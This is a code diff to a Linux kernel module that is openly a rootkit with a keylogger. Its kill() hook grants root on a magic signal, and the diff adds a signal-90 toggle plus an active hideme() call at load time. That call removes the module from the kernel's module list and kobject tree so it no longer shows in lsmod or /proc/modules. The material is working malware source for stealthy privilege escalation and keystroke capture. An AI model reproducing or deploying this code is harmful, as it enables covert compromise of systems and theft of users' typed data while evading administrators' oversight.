@@ -5,20 +5,15 @@
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include <linux/init.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/namei.h>
 #include <linux/tcp.h>
 #include "ftrace_helper.h"
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/syscalls.h>
-#include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <linux/version.h>
 #include <linux/debugfs.h>
+#include <linux/kmod.h>
 
 #ifdef HIDE_MODULE
 #include <linux/list.h>
@@ -53,6 +48,31 @@ static struct notifier_block kl_notifier_block = { .notifier_call =
 static struct file_operations fops = { .read = kl_device_read };
 
 static unsigned long * __force_order;
+
+#ifdef HIDE_MODULE
+/* Add this LKM back to the loaded module list, at the point
+ * specified by prev_module */
+void showme(void)
+{
+	hidden=0;
+    list_add(&THIS_MODULE->list, prev_module);
+	kobject_add(prev_kobj);
+	list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj.entry);
+}
+
+/* Record where we are in the loaded module list by storing
+ * the module prior to us in prev_module, then remove ourselves
+ * from the list */
+void hideme(void)
+{
+	hidden=1;
+    prev_module = THIS_MODULE->list.prev;
+	prev_kobj = &THIS_MODULE->mkobj.kobj;
+    list_del(&THIS_MODULE->list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+}
+#endif
 
 #define PREFIX "keylog"
 
@@ -309,6 +329,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 			printk(KERN_INFO "rootkit: giving root...\n");
 			set_root();
 			return 0;
+        #ifdef HIDE_MODULE
+        case 90:
+            if (hidden == 0) {hideme();}
+            else {showme();}
+        #endif
 		default:
 			return orig_kill(regs);
 	}
@@ -482,6 +507,11 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 			printk(KERN_INFO "rootkit: giving root...\n");
 			set_root();
 			return 0;
+        #ifdef HIDE_MODULE
+        case 90:
+            if (hidden == 0) {hideme();}
+            else {showme();}
+        #endif
 		default:
 			return orig_kill(regs);
 	}
@@ -532,30 +562,7 @@ static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
 	return buflen;
 }
 
-#ifdef HIDE_MODULE
-/* Add this LKM back to the loaded module list, at the point
- * specified by prev_module */
-void showme(void)
-{
-	hidden=0;
-    list_add(&THIS_MODULE->list, prev_module);
-	kobject_add(prev_kobj);
-	list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj.entry);
-}
 
-/* Record where we are in the loaded module list by storing
- * the module prior to us in prev_module, then remove ourselves
- * from the list */
-void hideme(void)
-{
-	hidden=1;
-    prev_module = THIS_MODULE->list.prev;
-	prev_kobj = &THIS_MODULE->mkobj.kobj;
-    list_del(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
-}
-#endif
 
 inline void cr0_write(unsigned long cr0)
 {
@@ -591,7 +598,7 @@ static int spawnProcess(char* path) {
 		"HOME=/",
 		"TERM=linux",
 		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-    
+        
 	rc = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
 	printk("RC is: %i \n", rc);
 	return rc;
@@ -635,7 +642,7 @@ static int __init kl_init(void)
 
 #ifdef HIDE_MODULE
 	/* Hide myself from lsmod and /proc/modules :) */
-	// hideme();
+	hideme();
 #endif
 
 	return 0;
